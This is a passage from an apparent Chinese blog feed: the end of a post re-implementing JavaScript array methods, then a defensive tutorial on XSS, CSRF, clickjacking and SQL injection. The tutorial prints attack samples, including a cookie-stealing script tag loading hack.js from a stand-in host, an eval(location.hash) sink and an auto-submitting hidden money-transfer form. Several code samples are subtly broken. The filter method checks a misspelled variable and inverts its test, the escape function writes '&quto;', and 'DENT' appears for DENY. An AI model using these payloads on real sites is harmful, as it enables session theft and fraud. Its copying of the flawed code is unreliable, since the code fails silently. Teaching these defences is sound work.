</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> callBack !== <span class="string">&quot;function&quot;</span>) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">&quot;callBack must be function&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> initial === <span class="string">&quot;undefined&quot;</span>) &#123;</span><br><span class="line">        initial = <span class="built_in">this</span>[<span class="number">0</span>];</span><br><span class="line">        i = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (; i &lt; <span class="built_in">this</span>.length; i++) &#123;</span><br><span class="line">        initial = callBack(initial, <span class="built_in">this</span>[i], i)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> initial;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="find"><a href="#find" class="headerlink" title="find"></a>find</h3><ul><li>返回值：找到就返回符合的元素，没有返回 undefined</li><li>思路：遍历数组</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Array</span>.prototype.myFind = <span class="function"><span class="keyword">function</span> (<span class="params">callBack</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="built_in">this</span>.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (callBack(<span class="built_in">this</span>[i], i)) <span class="keyword">return</span> <span class="built_in">this</span>[i]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="every"><a href="#every" class="headerlink" title="every"></a>every</h3><ul><li>返回值：只要有一个不符合返回false，如果都符合返回 true</li><li>思路：遍历数组，一假即假</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Array</span>.prototype.myEvery = <span class="function"><span class="keyword">function</span> (<span class="params">callBack</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="built_in">this</span>.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!callBack(<span class="built_in">this</span>[i], i)) <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="some"><a href="#some" class="headerlink" title="some"></a>some</h3><ul><li>返回值：只要有一个符合就返回 true，如果都符合返回 false</li><li>思路：遍历数组，一真即真</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Array</span>.prototype.mySome = <span class="function"><span class="keyword">function</span> (<span class="params">callBack</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="built_in">this</span>.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (callBack(<span class="built_in">this</span>[i], i)) <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="filter"><a href="#filter" class="headerlink" title="filter"></a>filter</h3><ul><li>返回值：一个新数组，数组里面是符合条件的所有元素</li><li>思路：遍历数组</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Array</span>.prototype.myFilter = <span class="function"><span class="keyword">function</span> (<span class="params">callBack</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">Array</span>.isArray(<span class="built_in">this</span>) || !<span class="built_in">this</span>.length || <span class="keyword">typeof</span> callback !== <span class="string">&#x27;function&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> arr = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="built_in">this</span>.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!callBack(<span class="built_in">this</span>[i], i)) &#123;</span><br><span class="line">            arr.push(<span class="built_in">this</span>[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arr</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">用原生JS 封装数组操作、重排、位置、迭代等方法。首先需要知道对该方法返回值以及是否改变原数组，接下来再看一下简单思路，最后看封装代码</summary>
    
    
    
    <category term="JavaScript" scheme="http://llmysnow.top/categories/JavaScript/"/>
    
    
    <category term="封装" scheme="http://llmysnow.top/tags/%E5%B0%81%E8%A3%85/"/>
    
    <category term="JavaScript" scheme="http://llmysnow.top/tags/JavaScript/"/>
    
    <category term="数组" scheme="http://llmysnow.top/tags/%E6%95%B0%E7%BB%84/"/>
    
  </entry>
  
  <entry>
    <title>常见 Web 攻击（前端篇）</title>
    <link href="http://llmysnow.top/posts/8188972/"/>
    <id>http://llmysnow.top/posts/8188972/</id>
    <published>2021-08-30T02:30:08.609Z</published>
    <updated>2021-08-30T02:30:08.609Z</updated>
    
    <content type="html"><![CDATA[<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>Cross Site Scripting（跨站脚本攻击），因为缩写和 CSS 重叠，所以改叫 XSS。跨站脚本攻击是指通过存在安全漏洞的 Web 网址注册用户的浏览器内运行非本站点 HTML 或 JavaScript 进行的一种攻击</p><p>跨站脚本攻击可以造成以下影响：</p><ul><li><p>利用虚假输入表单骗取用户个人信息</p></li><li><p>利用脚本窃取用户的 Cookie 值，被害者在不知情的情况下，帮助攻击者发送恶意请求</p><p>显示伪造的文章或图片</p></li></ul><h3 id="XSS-攻击分类"><a href="#XSS-攻击分类" class="headerlink" title="XSS 攻击分类"></a>XSS 攻击分类</h3><h4 id="反射型-XSS"><a href="#反射型-XSS" class="headerlink" title="反射型 XSS"></a>反射型 XSS</h4><ul><li><p>反射型：url 参数直接注入</p><p>URL 注入非法脚本，然后发送给受害用户</p><p>服务端返回的富文本中包含非法脚本，被直接展示</p></li></ul><p>反射型 XSS 攻击步骤：</p><ol><li>攻击者构造出特殊的 URL，其中包含恶意代码</li><li>用户打开带有恶意代码的 URL 时，网站服务端将恶意代码从 URL 中取出，拼接在 HTML 中返回给浏览器</li><li>用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行</li><li>恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 普通 --&gt;</span></span><br><span class="line">http://localhost:3000/?from=china</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- alert尝试 --&gt;</span></span><br><span class="line">http://localhost:3000/?from=<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(3)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 获取Cookie --&gt;</span></span><br><span class="line">http://localhost:3000/?from=<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://localhost:4000/hack.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 伪造cookie入侵 --&gt;</span></span><br><span class="line">document.cookie=&quot;...&quot;</span><br></pre></td></tr></table></figure><h4 id="存储型-XSS"><a href="#存储型-XSS" class="headerlink" title="存储型 XSS"></a>存储型 XSS</h4><ul><li><p>存储型：存储到 DB 后读取时注入</p><p>发帖中发出包含恶意代码的内容，其它用户访问到该内容后，满足特定条件即触发</p><p>后台不过滤信息，并且前端展示时也不过滤信息</p></li></ul><p>存储型 XSS 的攻击步骤：</p><ol><li>攻击者将恶意代码提交到目标网站的数据库中</li><li>用户打开网站时，网站服务端将恶意代码从数据库取出，拼接在 HTML 中返回给浏览器</li><li>用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行</li><li>恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 评论 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 跨站脚本注入 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://localhost:4000/hack.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="DOM-型-XSS"><a href="#DOM-型-XSS" class="headerlink" title="DOM 型 XSS"></a>DOM 型 XSS</h4><ul><li><p>DOM型：基于 DOM 或本地的 XSS 攻击</p><p>wifi 流量劫持、DNS 劫持，并且直接返回钓鱼页面</p></li></ul><p>DOM 型 XSS 其实是一种特殊类型的反射型 XSS，通过 <strong>JS 操作 DOM 树</strong> 动态地 <strong>输出数据到页面</strong>，而不依赖于将数据提交给服务器端，它是基于 DOM 文档对象模型的一种漏洞</p><p>DOM 型 XSS 的攻击步骤：</p><ol><li>攻击者构造出特殊的 URL，其中包含恶意代码</li><li>用户打开带有恶意代码的 URL</li><li>用户浏览器接收到响应后解析执行，前端 JavaScript 取出 URL 中的恶意代码并执行</li><li>恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.write(<span class="string">&quot;&lt;script&gt;alert(0)&lt;\/script&gt;&quot;</span>)</span></span><br><span class="line"><span class="javascript"><span class="built_in">eval</span>(location.hash.substr(<span class="number">1</span>))</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h4><p>反射型 XSS 跟存储型 XSS 区别：</p><ul><li>存储型 XSS 的恶意代码存在数据库里</li><li>反射型 XSS 的恶意代码存在 URL 里</li></ul><p>DOM 型 XSS 和前两种 XSS 区别：</p><ul><li>DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属于前端 JavaScript 自身的安全漏洞</li><li>其他两种 XSS 都属于服务端的安全漏洞</li></ul><h3 id="攻击危害"><a href="#攻击危害" class="headerlink" title="攻击危害"></a>攻击危害</h3><ul><li>盗取用户 Cookie</li><li>钓鱼攻击</li><li>偷取网站的任意数据</li><li>偷取用户的资料</li><li>偷取用户的秘密和登录态</li><li>删除目标文字、恶意篡改数据、嫁祸</li><li>劫持用户 Web 行为，进一步渗透内网</li><li>蠕虫式挂马攻击、刷广告、刷流量、破坏网上数据</li></ul><h3 id="防范手段"><a href="#防范手段" class="headerlink" title="防范手段"></a>防范手段</h3><h4 id="HEAD"><a href="#HEAD" class="headerlink" title="HEAD"></a>HEAD</h4><p>0：禁止 XSS 过滤</p><p>1：启用 XSS 过滤（通常浏览器是默认的）。如果检测到跨站脚本攻击，浏览器将清除页面（删除不安全的部分）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctx.set(<span class="string">&#x27;X-XSS-Protection&#x27;</span>, <span class="number">1</span>)</span><br></pre></td></tr></table></figure><h4 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h4><p><strong>内容安全策略</strong>（CSP, Content Security Policy）是一个附加的安全层，用于帮助检测和缓解某些类型的攻击，包括跨站脚本（XSS）和数据注入等攻击。这些攻击可用于实现从数据窃取到网站破坏或作为恶意软件分发版本等用途</p><p><strong>CSP 本质就是建立白名单</strong>，开发者明确告诉浏览器哪些外部资源可以加载和执行。我们只需要配置规则，如何拦截是由浏览器自己实现的。我们可以通过这种方式来尽量减少 XSS 攻击</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 只允许加载本站资源</span></span><br><span class="line">ctx.set(<span class="string">&#x27;Content-Security-Policy&#x27;</span>, <span class="string">&quot;default-src &#x27;self&#x27;&quot;</span>)</span><br><span class="line"><span class="comment">// 只允许加载 HTTPS 协议图片</span></span><br><span class="line">ctx.set(<span class="string">&#x27;Content-Security-Policy&#x27;</span>, <span class="string">&#x27;img-src https://*&#x27;</span>)</span><br><span class="line"><span class="comment">// 不允许加载任何来源框架</span></span><br><span class="line">ctx.set(<span class="string">&#x27;Content-Security-Policy&#x27;</span>, <span class="string">&quot;child-src &#x27;none&#x27;&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="转义字符（过滤）"><a href="#转义字符（过滤）" class="headerlink" title="转义字符（过滤）"></a>转义字符（过滤）</h4><ul><li>输入处理：用户输入、URL 参数、POST 请求参数、Ajax</li><li>输出处理：转为实体名称</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;% code %&gt; 用于执行其中JavaScript代码</span><br><span class="line">&lt;%&#x3D; code %&gt; 会对code进行html转义</span><br><span class="line">&lt;%- code %&gt; 不会进行转义</span><br></pre></td></tr></table></figure><ul><li><p>黑名单</p><p>用户的输入永远不可信任，最普通的做法就是转义输入输出的内容，对于引号、尖括号、斜杠进行转义</p><p>把显示结果转为实体名称</p><p><img data-src="https://gitee.com/lilyn/pic/raw/master/js-img/html%E5%AE%9E%E4%BD%93%E5%90%8D%E7%A7%B0.jpg"></p></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">  str = str.replace(<span class="regexp">/&amp;/g</span>, <span class="string">&#x27;&amp;amp;&#x27;</span>)</span><br><span class="line">  str = str.replace(<span class="regexp">/&lt;/g</span>, <span class="string">&#x27;&amp;lt;&#x27;</span>)</span><br><span class="line">  str = str.replace(<span class="regexp">/&gt;/g</span>, <span class="string">&#x27;&amp;gt;&#x27;</span>)</span><br><span class="line">  str = str.replace(<span class="regexp">/&quot;/g</span>, <span class="string">&#x27;&amp;quto;&#x27;</span>)</span><br><span class="line">  str = str.replace(<span class="regexp">/&#x27;/g</span>, <span class="string">&#x27;&amp;#39;&#x27;</span>)</span><br><span class="line">  str = str.replace(<span class="regexp">/`/g</span>, <span class="string">&#x27;&amp;#96;&#x27;</span>)</span><br><span class="line">  str = str.replace(<span class="regexp">/\//g</span>, <span class="string">&#x27;&amp;#x2F;&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> str</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>白名单</p><p>对于富文本来说，显然不能通过上面办法转义所有字符，因为这样会把需要的格式也过滤掉。对于这种情况，通常采用白名单过滤的方法</p><p><strong>对用户的输入进行合理的验证，对特殊字符（如：&lt;、&gt;、”、”等）</strong>以及 <code>&lt;script&gt;</code> 、javascript 等进行过滤</p></li></ul><p>编程语言解决方案：</p><ul><li><p>nodejs 使用 <a href="https://github.com/leizongmin/js-xss">js-xss</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xss = <span class="built_in">require</span>(<span class="string">&quot;xss&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> html = xss(<span class="string">&#x27;&lt;script&gt;alert(&quot;xss&quot;);&lt;/script&gt;&#x27;</span>);</span><br></pre></td></tr></table></figure></li><li><p>Java 使用 <a href="https://github.com/naver/lucy-xss-filter">lucy-xss-filter</a></p><p>Java 里，常用的转义库为  <code>org.owasp.encoder</code></p></li><li><p>Spring Boot</p><p><a href="https://zdran.com/20180511.html">Spring Boot 使用 Jsoup 拦截XSS</a></p></li></ul><h4 id="HttpOnly"><a href="#HttpOnly" class="headerlink" title="HttpOnly"></a>HttpOnly</h4><p>这是预防 XSS 攻击窃取用户 cookie 最有效的防御手段。Web 应用程序设置 cookie 时，将其属性设为 HttpOnly，就可以避免该网页的 cookie 被客户端恶意 JavaScript 窃取，保护用户 cookie 信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># node</span></span><br><span class="line">app.use(session(&#123; httpOnly: <span class="literal">true</span> &#125;, app))</span><br><span class="line"><span class="comment"># java</span></span><br><span class="line">cookie.setHttpOnly(<span class="literal">true</span>)</span><br><span class="line"><span class="comment"># python</span></span><br><span class="line">tools.sessions.httponly = True</span><br><span class="line"><span class="comment"># php</span></span><br><span class="line">session.cookie_httponly = 1</span><br></pre></td></tr></table></figure><h4 id="DOM-型注意"><a href="#DOM-型注意" class="headerlink" title="DOM 型注意"></a>DOM 型注意</h4><p>在使用 <code>innerHTML</code>、<code>outerHTML</code>、<code>document.write()</code> 时要特别小心，不要把不可信的数据作为 HTML 插入页面上，而应尽量使用 <code>.textContent</code> 、<code>setAttribute()</code> 等</p><p>如果使用 Vue 或 React 技术栈，并不适用 <code>v-html / dangerouslySetInnerHTML</code> 功能，就在前端 render 阶段避免 <code>innerHTML</code> 、<code>outerHTML</code> 的 XSS 隐患</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span> </span><br><span class="line"><span class="javascript"><span class="comment">// setTimeout()/setInterval() 中调⽤恶意代码</span></span></span><br><span class="line"><span class="javascript"><span class="built_in">setTimeout</span>(<span class="string">&quot;UNTRUSTED&quot;</span>)</span></span><br><span class="line"><span class="javascript"><span class="built_in">setInterval</span>(<span class="string">&quot;UNTRUSTED&quot;</span>)</span></span><br><span class="line"><span class="javascript"><span class="comment">// location 调⽤恶意代码</span></span></span><br><span class="line"><span class="javascript">location.href = <span class="string">&#x27;UNTRUSTED&#x27;</span></span></span><br><span class="line"><span class="javascript"><span class="comment">// eval() 中调⽤恶意代码</span></span></span><br><span class="line"><span class="javascript"><span class="built_in">eval</span>(<span class="string">&quot;UNTRUSTED&quot;</span>) </span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>对于不信任的输入，都应该限定一个合理的长度</strong></p><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>CSRF（Cross Site Request Forgery），即跨站请求伪造，是一种常见 Web 攻击，它利用用户已登录的身份，在用户毫不知情的情况下，已用户的名义完成非法操作</p><p>CSRF 攻击流程：</p><ul><li>受害者登录 <code>a.com</code>，并保留了登录凭证（Cookie）</li><li>攻击者引诱受害者访问了 <code>b.com</code></li><li><code>b.com</code> 向 <code>a.com</code> 发送了一个请求：<code>a.com/act=xxx</code> 浏览器会默认携带 <code>a.com</code> 的 Cookie</li><li><code>a.com</code> 接收到请求后，对请求进行验证，并确认是受害者的凭证，误认为是受害者自己发送的请求</li><li><code>a.com</code> 以受害者的名义执行了 <code>act=xxx</code></li><li>攻击完成，攻击者在受害者不知情的情况下，冒充受害者，让 <code>a.com</code> 执行了自己定义的操作</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- GET 请求 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1:9000/transfer?to_user=jack&amp;money=2000&quot;</span> <span class="attr">width</span>=<span class="string">&quot;500&quot;</span> <span class="attr">height</span>=<span class="string">&quot;300&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- POST 请求 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">style</span>=<span class="string">&quot;display: none&quot;</span> <span class="attr">name</span>=<span class="string">&quot;csrf-frame&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://127.0.0.1:9000/transfer&quot;</span> <span class="attr">target</span>=<span class="string">&quot;csrf-frame&quot;</span> <span class="attr">id</span>=<span class="string">&quot;csrf-form&quot;</span> &gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;to_user&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hack01&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;money&quot;</span> <span class="attr">value</span>=<span class="string">&quot;2000&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.getElementById(<span class="string">&quot;csrf-form&quot;</span>).submit()</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="CSRF-攻击危害"><a href="#CSRF-攻击危害" class="headerlink" title="CSRF 攻击危害"></a>CSRF 攻击危害</h3><ul><li>利用用户登录态</li><li>用户不知情</li><li>完成业务需求</li><li>盗取用户资金（转账、消费）</li><li>冒充用户发帖背锅</li><li>损害网站声誉</li></ul><h3 id="防范手段-1"><a href="#防范手段-1" class="headerlink" title="防范手段"></a>防范手段</h3><p>CSRF 两个特点：</p><ul><li><p>CSRF（通常）发生在第三方域名</p><p>阻止不明外域的访问（同源检测、Samesite Cookie）</p></li><li><p>CSRF 攻击者不能获取到 Cookie 等信息，只是使用</p><p>提交时要求附加本域才能获取的信息（CSRF Token、双重 Cookie 验证）</p></li></ul><p>cookie 的应用场景：</p><ul><li>自动登录</li><li>电商购物车功能</li><li>记录用户登录网址的次数</li><li>商品浏览记录</li></ul><p>防范手段：</p><ul><li><p>验证码</p></li><li><p><strong>同源检测 验证 Referer</strong></p><p>HTTP 协议头中有一个字段叫 referer，记录了该 HTTP 请求的来源地址</p><p>Https 不发生 referer</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">app.use(<span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">    <span class="keyword">await</span> next()</span><br><span class="line">    <span class="keyword">const</span> referer = ctx.request.header.referer</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;Referer:&#x27;</span>, referer)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><img data-src="https://gitee.com/lilyn/pic/raw/master/js-img/HTTP%20Referer.jpg" style="zoom:80%;" /><p>比如：转账的操作一定是用户登陆之后在本站点的页面上操作的，因此可以讲 Referer 字段限制为只允许本站点</p></li><li><p><strong>Anti CSRF Token</strong></p><p>所有用户请求都携带一个 CSRF 攻击者无法获取到的 Token。服务器通过校验请求是否携带正确 Token，来把正确请求和攻击的请求区分开</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;csrf-token&quot;</span> <span class="attr">content</span>=<span class="string">&quot;...&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>确保 token 的保密性和随机性</p></li><li><p>cookie 双重验证</p><p>CSRF 成功的原因在于站点对于用户身份的辨别依赖于 Cookie，因此攻击者可以在不知道用户口令的情况下直接使用用户的 Cookie 来通过安全验证</p></li></ul><p><strong>Samesite Cookie 属性</strong></p><ul><li><code>Samesite=Strict</code>：严格模式，表明这个 Cookie 在任何情况下都不可能作为第三方 Cookie</li><li><code>Samesite=Lax</code>：宽松模式，比 Strict 放宽了点限制，假如这个请求是这个请求且是个 GET 请求，则这个 Cookie 可以作为第三方 Cookie</li></ul><p>注意：这个可以解决 <code>某些 Cookie 滥用推荐的“SameSite“属性 </code> 问题</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Cookies.set(<span class="string">&#x27;lang&#x27;</span>, lang, &#123;</span><br><span class="line">  sameSite: <span class="string">&#x27;Strict&#x27;</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="点击劫持-clickjacking"><a href="#点击劫持-clickjacking" class="headerlink" title="点击劫持 clickjacking"></a>点击劫持 clickjacking</h2><p>点击劫持是一种视觉欺骗的攻击手段。攻击者将需要攻击的网站通过 iframe 嵌套的方式嵌入自己的网页中，并将 iframe 设置为透明，在页面透出一个按钮诱导用户点击</p><ul><li><p>DNS 劫持：（输入京东被强制跳转到淘宝，这就属于 DNS 劫持）</p><p>DNS 强制解析：通过修改运营商的本地 DNS 记录，来引导用户流量到缓存服务器</p><p>302 跳转的方式：通过监控网络出口的流量，分析判断哪些内容是可以进行劫持处理的，再对劫持内存发起 302 跳转的回复，引导用户获取内容</p></li><li><p>HTTP 劫持：（访问谷歌但是一直有贪玩蓝月的广告）由于 http 明文传输，运营商会修改你的 http 响应内容（即加广告）</p></li></ul><h3 id="防范手段-2"><a href="#防范手段-2" class="headerlink" title="防范手段"></a>防范手段</h3><ul><li><p>最有效的方法就是全站 HTTPS，即 HTTP 加密，这使得运营商无法获取明文，就无法劫持你的响应内容</p></li><li><p>X-FRAME-OPTIONS</p><p><code>X-FRAME-OPTIONS</code> 是一个 HTTP 响应头，在现代浏览器有一个很好的支持。这个 HTTP 响应头就是为了防御用 iframe 嵌套的点击劫持</p><p>改响应头有三个值可选，分别是：</p><ul><li><code>DENT</code> ：页面不允许通过 iframe 的方式展示</li><li><code>SAMEORIGIN</code> ：页面可以在相同域名下通过 iframe 的方式展示</li><li><code>ALLOW-FROM</code> ：页面可以在指定来源的 iframe 中展示</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctx.set(<span class="string">&#x27;X-FRAME-OPTIONS&#x27;</span>, <span class="string">&#x27;DENY&#x27;</span>)</span><br></pre></td></tr></table></figure></li></ul><h2 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h2><p>SQL 注入发生于 <strong>应用程序与数据库层</strong> 的安全漏洞</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 填入特殊密码</span></span><br><span 